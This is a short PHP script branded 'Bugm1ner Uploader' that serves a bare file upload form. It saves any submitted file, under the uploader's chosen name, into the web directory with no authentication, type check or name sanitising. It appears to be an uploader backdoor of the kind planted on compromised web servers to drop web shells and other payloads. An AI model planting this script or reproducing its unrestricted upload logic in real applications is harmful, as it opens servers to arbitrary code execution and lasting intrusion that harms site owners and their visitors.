<?php
echo 'Bugm1ner Uploader<br><br><form action="" method="post" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" name="upload" value="Upload"></form>'; 
if (isset($_POST['upload'])) { $file = $_FILES['file']; $destination = $file['name']; if (move_uploaded_file($file['tmp_name'], $destination)) { echo "<p>Upload successful! <a href='$destination' target='_blank'>$destination</a></p>"; } else { echo "<p>Upload failed!</p>"; } }
?>
